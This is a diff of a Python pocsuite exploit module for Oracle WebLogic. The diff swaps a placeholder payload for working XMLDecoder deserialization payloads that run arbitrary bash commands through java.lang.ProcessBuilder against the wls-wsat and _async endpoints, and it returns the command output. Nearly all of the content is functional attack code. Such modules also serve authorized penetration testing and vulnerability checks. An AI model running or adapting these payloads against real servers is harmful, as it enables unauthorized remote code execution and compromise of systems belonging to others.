@@ -4,6 +4,8 @@ from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
 from pocsuite.api.request import req
 from urlparse import urlparse, urljoin
+from pocsuite.lib.core.enums import CUSTOM_LOGGING
+from pocsuite.lib.core.data import logger
 import urllib
 import string
 
@@ -28,34 +30,9 @@ class TestPOC(POCBase):
     samples = ['']
     install_requires = ['']
 
-    def _verify(self):
+    def _attack(self):
         '''verify mode'''
-        def poc_from_wls(headers, body):
-            vul_url = urljoin(base_url, "/wls-wsat/CoordinatorPortType")
-            rce_result = req.post(vul_url, verify=False,
-                                  headers=headers, data=body).text
-            if rce_result and ("bin" and "server") in rce_result:
-                result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = self.url
-
-        def poc_from_asy():
-            path = "/_async/AsyncResponseService"
-            vul_url = urljoin(base_url, path)
-            payload = '''<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n<soapenv:Header>\n<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<void class=\"POC\">\n<array class=\"xx\" length=\"0\">\n</array>\n<void method=\"start\"/>\n</void>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body>\n<asy:onAsyncDelivery/>\n</soapenv:Body>\n</soapenv:Envelope>\n'''
-            sent_poc_header = {
-                "Content-type": "text/xml"
-            }
-            sent_poc = req.post(vul_url, headers=sent_poc_header, data=payload)
-            if sent_poc.status_code == 202:
-                result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = self.url
-        result = {}
-        base_url = self.url
-        port = urlparse(base_url).port
-        if port is None:
-            base_url = self.url + ":7001"
-        cmd = "ls"
-        try:
+        def poc_from_wls_v12(cmd):
             headers = {
                 "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                 "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
@@ -116,8 +93,12 @@ class TestPOC(POCBase):
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''.format(cmd)
-            poc_from_wls(headers, body)
-        except:
+            vul_url = urljoin(base_url, "/wls-wsat/CoordinatorPortType")
+            rce_result = req.post(vul_url, verify=False,
+                                  headers=headers, data=body).content
+            return rce_result
+
+        def poc_from_wls_v10(cmd):
             headers = {
                 "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                 "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
@@ -138,12 +119,72 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  </soapenv:Header>
  <soapenv:Body></soapenv:Body></soapenv:Envelope>
             '''
-            poc_from_wls(headers, body)
+            vul_url = urljoin(base_url, "/wls-wsat/CoordinatorPortType")
+            rce_result = req.post(vul_url, verify=False,
+                                  headers=headers, data=body).content
+
+            return rce_result
+
+        def poc_from_asy(cmd):
+            path = "/_async/AsyncResponseService"
+            vul_url = urljoin(base_url, path)
+            payload = '''
+            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
+            <soapenv:Header> 
+            <wsa:Action>xx</wsa:Action>
+            <wsa:RelatesTo>xx</wsa:RelatesTo>
+            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+            <void class="java.lang.ProcessBuilder">
+            <array class="java.lang.String" length="3">
+            <void index="0">
+            <string>/bin/bash</string>
+            </void>
+            <void index="1">
+            <string>-c</string>
+            </void>
+            <void index="2">
+            <string>{}</string>
+            </void>
+            </array>
+            <void method="start"/></void>
+            </work:WorkContext>
+            </soapenv:Header>
+            <soapenv:Body>
+            <asy:onAsyncDelivery/>
+            </soapenv:Body></soapenv:Envelope>
+            '''.format(cmd)
+            sent_poc_header = {
+                "Content-type": "text/xml"
+            }
+            sent_poc = req.post(vul_url, headers=sent_poc_header, data=payload)
+            if sent_poc.status_code == 202:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = self.url
+                result['VerifyInfo']['cmd'] = cmd
+            return sent_poc.status_code
+
+        result = {}
+        base_url = self.url
+        port = urlparse(base_url).port
+        if port is None:
+            base_url = self.url + ":7001"
+        base_cmd = "ls"
+        poc_response_v10 = poc_from_wls_v10(base_cmd)
+        if ("bin" and "server" )in poc_response_v10 and "<" not in poc_response_v10:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            result['VerifyInfo']['Version'] = "version 10.*"
         else:
-            poc_from_asy()
+            poc_response_v12 = poc_from_wls_v12(base_cmd)
+            if ("bin" and "server" )in poc_response_v12 and "<" not in poc_response_v12:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = self.url
+                result['VerifyInfo']['Version'] = "version 12.*"
+                if result['VerifyInfo'] == None:
+                    poc_from_asy(base_cmd)
         return self.parse_output(result)
 
-    _attack = _verify
+    _verify = _attack
 
     def parse_output(self, result):
         # parse output
